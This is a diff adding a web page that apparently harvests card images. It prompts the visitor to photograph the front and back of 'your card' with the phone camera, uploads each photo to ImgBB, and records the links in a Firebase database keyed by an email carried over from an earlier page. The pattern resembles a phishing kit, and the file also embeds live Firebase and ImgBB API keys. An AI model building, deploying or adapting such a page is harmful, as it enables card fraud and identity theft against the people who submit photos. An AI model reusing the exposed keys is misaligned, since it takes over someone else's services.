@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Capture and Store Card Images</title>
+  <style>
+    video, canvas {
+      display: block;
+      margin: 10px auto;
+    }
+    button {
+      display: block;
+      margin: 20px auto;
+    }
+    p {
+      text-align: center;
+      font-size: 1.2em;
+    }
+  </style>
+
+  <!-- Firebase v8 SDK -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+</head>
+<body>
+  <h1>Capture and Store Card Images</h1>
+
+  <!-- Video preview from camera -->
+  <video id="video" autoplay playsinline></video>
+  <button id="capture">Capture</button>
+
+  <!-- Hidden canvas to capture the image -->
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <p id="response">Please snap the front picture of your card.</p>
+
+  <script>
+    // Firebase Configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyBZehk_8tWBhQOtCcS3VTzRRSCFCLvFGQA",
+      authDomain: "tuak-9f342.firebaseapp.com",
+      databaseURL: "https://tuak-9f342-default-rtdb.firebaseio.com",
+      projectId: "tuak-9f342",
+      storageBucket: "tuak-9f342.appspot.com",
+      messagingSenderId: "9176071516",
+      appId: "1:9176071516:web:38491206a78ed1c4035599",
+      measurementId: "G-BM58W3CJTQ"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const captureButton = document.getElementById('capture');
+    const responseText = document.getElementById('response');
+
+    let isFrontImageCaptured = false;
+
+    // Access the camera (back camera specifically)
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "environment" }
+        });
+        video.srcObject = stream;
+      } catch (error) {
+        console.error('Error accessing the camera:', error);
+        alert('Camera access denied or unavailable.');
+      }
+    }
+
+    // Function to upload image to ImgBB and store in Firebase
+    async function uploadImage(blob, key) {
+      const formData = new FormData();
+      formData.append('image', blob);
+
+      const apiKey = '87ba063b9c356db7082b07f643a2f6e4'; // Replace with your ImgBB API key
+      const apiUrl = `https://api.imgbb.com/1/upload?key=${apiKey}`;
+
+      const response = await fetch(apiUrl, { method: 'POST', body: formData });
+      const result = await response.json();
+
+      if (result.success) {
+        const imageUrl = result.data.url;
+
+        // Get the user's email from local storage
+        const email = localStorage.getItem('userEmail');
+        const sanitizedEmail = email.replace(/\./g, ',');
+
+        // Store the image URL in Firebase under the email key
+        await firebase.database().ref(`messages/${sanitizedEmail}`).update({
+          [key]: imageUrl,
+          timestamp: Date.now()
+        });
+
+        return imageUrl;
+      } else {
+        throw new Error('Image upload failed');
+      }
+    }
+
+    // Capture button click event
+    captureButton.addEventListener('click', async () => {
+      const context = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+
+      // Draw the current video frame onto the canvas
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // Convert the canvas image to a Blob
+      canvas.toBlob(async (blob) => {
+        if (!blob) {
+          alert('Failed to capture image.');
+          return;
+        }
+
+        try {
+          if (!isFrontImageCaptured) {
+            // Upload front image
+            await uploadImage(blob, 'imageUrl');
+            responseText.innerText = 'Please snap the back picture of your card.';
+            isFrontImageCaptured = true;
+          } else {
+            // Upload back image
+            await uploadImage(blob, 'imageUrl1');
+            responseText.innerText = 'Success!';
+
+            // Stop the camera after capturing the back image
+            const stream = video.srcObject;
+            const tracks = stream.getTracks();
+            tracks.forEach(track => track.stop());
+            video.srcObject = null;
+
+            // Hide the capture button after success
+            captureButton.style.display = 'none';
+          }
+        } catch (error) {
+          console.error('Error uploading image:', error);
+          responseText.innerText = 'Error uploading image.';
+        }
+      }, 'image/jpeg');
+    });
+
+    // Start the camera when the page loads
+    window.onload = startCamera;
+  </script>
+</body>
+</html>
